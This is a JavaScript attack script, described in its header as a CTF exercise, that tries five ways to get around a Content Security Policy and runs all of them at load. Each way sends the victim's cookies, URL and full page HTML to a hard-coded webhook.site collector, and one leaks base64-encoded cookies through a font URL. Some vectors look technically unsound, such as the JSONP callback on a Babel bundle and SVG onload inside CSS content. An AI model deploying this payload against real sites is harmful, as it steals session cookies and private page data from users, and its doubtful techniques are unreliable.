// CSP Bypass Script for CTF Challenge
// CSP: default-src unpkg.com fonts.gstatic.com cdn.jsdelivr.net; style-src 'nonce-nouTPnAUC0SmmgGkdxH0uw==' unpkg.com fonts.googleapis.com cdn.jsdelivr.net;

// Strategy 1: JSONP via allowed CDNs
function jsonpBypass() {
  // Try JSONP with cdn.jsdelivr.net
  window.exfilData = function(data) {
    // This callback will be called by JSONP
    fetch("https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        method: "jsonp",
        url: location.href,
        cookies: document.cookie,
        html: document.documentElement.outerHTML
      })
    });
  };
  
  // Load JSONP script from allowed domain
  const script = document.createElement('script');
  script.src = 'https://cdn.jsdelivr.net/npm/@babel/standalone/babel.min.js?callback=exfilData';
  document.head.appendChild(script);
}

// Strategy 2: Nonce extraction and inline script injection
function nonceBypass() {
  const styleTag = document.querySelector('style[nonce]');
  const nonce = styleTag ? styleTag.nonce : null;
  console.log('Extracted nonce:', nonce);
  
  if (nonce) {
    // Create script with extracted nonce
    const script = document.createElement('script');
    script.nonce = nonce;
    script.textContent = `
      fetch("https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          method: "nonce_bypass",
          nonce: "${nonce}",
          url: location.href,
          cookies: document.cookie,
          html: document.documentElement.outerHTML
        })
      });
    `;
    document.head.appendChild(script);
  }
}

// Strategy 3: CDN Package Abuse
function cdnPackageBypass() {
  // Load a legitimate package that might have exploitable features
  const packages = [
    'https://unpkg.com/axios/dist/axios.min.js',
    'https://cdn.jsdelivr.net/npm/lodash@4.17.21/lodash.min.js',
    'https://unpkg.com/jquery@3.6.0/dist/jquery.min.js'
  ];
  
  packages.forEach(pkg => {
    const script = document.createElement('script');
    script.src = pkg;
    script.onload = function() {
      // After package loads, try to use it for exfiltration
      if (window.axios) {
        axios.post("https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497", {
          method: "cdn_package_axios",
          url: location.href,
          cookies: document.cookie,
          html: document.documentElement.outerHTML
        });
      }
      if (window.jQuery) {
        jQuery.post("https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497", {
          method: "cdn_package_jquery",
          url: location.href,
          cookies: document.cookie,
          html: document.documentElement.outerHTML
        });
      }
    };
    document.head.appendChild(script);
  });
}

// Strategy 4: CSS Injection via allowed style sources
function cssInjectionBypass() {
  // Try to load CSS from allowed sources that might execute JS
  const styleTag = document.querySelector('style[nonce]');
  const nonce = styleTag ? styleTag.nonce : null;
  
  if (nonce) {
    const style = document.createElement('style');
    style.nonce = nonce;
    // CSS with potential JS execution vectors
    style.textContent = `
      body::before {
        content: url('data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" onload="fetch(\\'https://webhook.site/bf4a918f-96c6-407d-8ac3-92da9e493497\\', {method: \\'POST\\', body: JSON.stringify({method: \\'css_injection\\', url: location.href, cookies: document.cookie})})"></svg>');
      }
    `;
    document.head.appendChild(style);
  }
}

// Strategy 5: Font-based data exfiltration
function fontExfilBypass() {
  // Use allowed font sources for potential data exfiltration
  const style = document.createElement('style');
  const cookies = document.cookie;
  const encodedCookies = btoa(cookies);
  
  style.textContent = `
    @font-face {
      font-family: 'exfil';
      src: url('https://fonts.gstatic.com/s/roboto/v27/KFOmCnqEu92Fr1Mu4mxK.woff2?data=${encodedCookies}');
    }
    body { font-family: 'exfil'; }
  `;
  document.head.appendChild(style);
}

// Execute all bypass strategies
console.log('Starting CSP bypass attempts...');
jsonpBypass();
nonceBypass();
cdnPackageBypass();
cssInjectionBypass();
fontExfilBypass();
